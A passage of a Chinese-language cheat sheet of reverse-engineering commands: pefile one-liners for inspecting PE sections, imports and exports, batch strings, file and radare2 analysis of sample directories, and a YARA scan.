python3 -c "import pefile; pe=pefile.PE('program.exe'); print(pe.dump_info())"
```

**基本写法:查看 PE 节区**
`python3 -c "import pefile; pe=pefile.PE('<文件>'); [print(s.Name, s.VirtualAddress) for s in pe.sections]"`
```bash
# 查看 PE 文件的节区信息
python3 -c "import pefile; pe=pefile.PE('program.exe'); [print(s.Name.decode(), hex(s.VirtualAddress)) for s in pe.sections]"
```

**基本写法:查看 PE 导入表**
`python3 -c "import pefile; pe=pefile.PE('<文件>'); print(pe.DIRECTORY_ENTRY_IMPORT)"`
```bash
# 查看 PE 文件的导入表
python3 -c "import pefile; pe=pefile.PE('program.exe'); [print(entry.dll, [imp.name for imp in entry.imports]) for entry in pe.DIRECTORY_ENTRY_IMPORT]"
```

**基本写法:查看 PE 导出表**
`python3 -c "import pefile; pe=pefile.PE('<文件>'); print(pe.DIRECTORY_ENTRY_EXPORT)"`
```bash
# 查看 PE 文件的导出表
python3 -c "import pefile; pe=pefile.PE('program.dll'); [print(exp.name) for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols]"
```

---

## 自动化逆向脚本

**基本写法:批量提取字符串**
`for f in <目录>/*; do strings -n 8 "$f"; done`
```bash
# 批量提取目录中所有文件的字符串
for f in /malware/*; do echo "=== $f ==="; strings -n 8 "$f"; done
```

**基本写法:批量获取文件信息**
`for f in <目录>/*; do file "$f"; done`
```bash
# 批量检测文件类型
for f in /malware/*; do echo "$f: $(file -b "$f")"; done
```

**基本写法:radare2 批量分析**
`for f in <目录>/*; do r2 -q -c "iI" "$f"; done`
```bash
# 批量获取文件基本信息
for f in /samples/*; do echo "=== $f ==="; r2 -q -c "iI" "$f"; done
```

**基本写法:生成分析报告**
`r2 -q -c "iI; ie; afl; iz" <文件> > <报告>`
```bash
# 生成文件分析报告
r2 -q -c "iI; ie; afl; iz" ./binary > analysis_report.txt
```

**基本写法:YARA 规则扫描**
`yara -r <规则文件> <目标文件>`
```bash
# 使用 YARA 规则匹配二进制特征
yara -r malware_rules.yar ./binary
```
